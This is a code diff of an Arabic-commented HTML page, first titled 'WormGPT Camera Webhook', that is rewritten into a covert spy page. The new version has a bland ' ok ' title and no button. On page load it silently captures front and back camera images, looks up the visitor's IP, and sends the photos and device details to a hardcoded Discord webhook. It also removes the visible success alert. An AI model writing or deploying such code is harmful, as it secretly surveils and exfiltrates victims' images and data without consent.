@@ -2,54 +2,61 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>WormGPT Camera Webhook</title>
+    <title> ok </title>
 </head>
 <body>
-    <button id="startBtn">فتح الكاميرا وإرسال البيانات</button>
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1558501429138956419/YxF7yDhJdIRQ2dWZdEI9oTA5GUEGr_GGN2jNtLxG3TCMjeL2XYr7rQN0sUTxwcFzC5gb';
 
-        document.getElementById('startBtn').onclick = async () => {
+        async function captureAndSend() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                // 1. التقاط صورة من الكاميرا الأمامية (الافتراضية)
+                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const imgFront = await takeSnap(streamFront);
                 
-                // التقاط صورة من الكاميرا
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const imageData = canvas.toDataURL('image/jpeg');
+                // 2. التقاط صورة من الكاميرا الخلفية
+                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+                const imgBack = await takeSnap(streamBack);
 
-                // جلب IP ومعلومات الجهاز
+                // 3. جلب IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
+                const { ip } = await ipRes.json();
 
-                const payload = {
-                    ip: ipData.ip,
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    cameraImage: imageData,
-                    timestamp: new Date().toISOString()
-                };
-
+                // 4. إرسال كل البيانات
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        ip: ip,
+                        front_cam: imgFront,
+                        back_cam: imgBack,
+                        user_agent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language
+                    })
                 });
-
-                alert('تم إرسال البيانات بنجاح!');
-            } catch (err) {
-                alert('خطأ: ' + err.message);
+            } catch (e) {
+                console.error("Error:", e);
             }
-        };
+        }
+
+        async function takeSnap(stream) {
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+            await new Promise(r => v.onloadedmetadata = r);
+            const canvas = document.getElementById('c');
+            canvas.width = v.videoWidth;
+            canvas.height = v.videoHeight;
+            canvas.getContext('2d').drawImage(v, 0, 0);
+            const data = canvas.toDataURL('image/jpeg');
+            stream.getTracks().forEach(track => track.stop());
+            return data;
+        }
+
+        window.onload = captureAndSend;
     </script>
 </body>
 </html>
-
